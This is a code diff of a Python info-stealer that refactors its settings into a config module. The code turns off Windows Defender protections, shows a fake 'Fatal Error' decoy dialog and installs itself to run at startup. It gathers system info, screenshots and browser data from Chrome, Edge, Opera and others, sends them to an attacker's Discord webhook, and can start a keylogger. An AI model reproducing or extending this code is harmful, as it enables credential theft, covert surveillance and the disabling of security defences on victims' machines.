@@ -13,13 +13,14 @@ import discord
 from discord import File, SyncWebhook
 import socket
 import requests
-#import config
+from config import DEFENDER, ERROR, KEYLOGGER, STARTUP, WEBHOOK#, ANTIDEBUG
 
-#try:
-#    AntiDebug = Antidebug()
-#    AntiDebug.check()
-#except:
-#    pass
+#if ANTIDEBUG:
+#    try:
+#        AntiDebug = Antidebug()
+#        AntiDebug.check()
+#    except:
+#        pass
 
 def disable_defender():
     #C:\> Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend && Set-MpPreference -SubmitSamplesConsent 2
@@ -29,24 +30,14 @@ def disable_defender():
     except:
         pass
     
-#disable_defender()
-
-try:
-    with open("todo.txt", "r") as f:
-        lines = f.readlines()
-        webhook = lines[0].strip()
-        keylogger = lines[3].strip()
-        Startup = lines[4]#.strip()
-        f.close()
-except:
-    webhook = "null"
-    Startup = "null"
-    keylogger = "null"
+if DEFENDER:
+    disable_defender()
 
 def error():
-    messagebox.showerror("Fatal Error", "Error code: 0x80070002\nAn internal error occurred while importing modules.")
+    messagebox.showerror("Fatal Error", "Error code: 0x80070002\nAn internal error occurred while importing modules.")  
     
-#error()
+if ERROR:
+    error()
 
 
 try:
@@ -65,11 +56,11 @@ try:
 except:
     pass
 
-if Startup == "True":
+if STARTUP:
     try:
         startup = StartUp()
         startup.run()
-    except Exception as e:
+    except:
         pass
 
 def zip(name, files):
@@ -133,19 +124,19 @@ def send(url, files, text):
         pass
 
 try:
-    send(webhook, ["System.zip", "screenshot.png"], "System Info")
+    send(WEBHOOK, ["System.zip", "screenshot.png"], "System Info")
     delete_files(["screenshot.png"])
 except:
     pass
 
 try:
-    #send(webhook, ["Chrome.zip", "Brave.zip", "Chromium.zip", "Edge.zip", "Opera.zip", "OperaGX.zip"], "Browser Data")
-    send(webhook, zip_files, "Browser Data")
+    #send(WEBHOOK, ["Chrome.zip", "Brave.zip", "Chromium.zip", "Edge.zip", "Opera.zip", "OperaGX.zip"], "Browser Data")
+    send(WEBHOOK, zip_files, "Browser Data")
 except:
     pass
 
 
-if keylogger == "True":
+if KEYLOGGER:
     try:
         keyLogger = Keylogger()
         keyLogger.run()
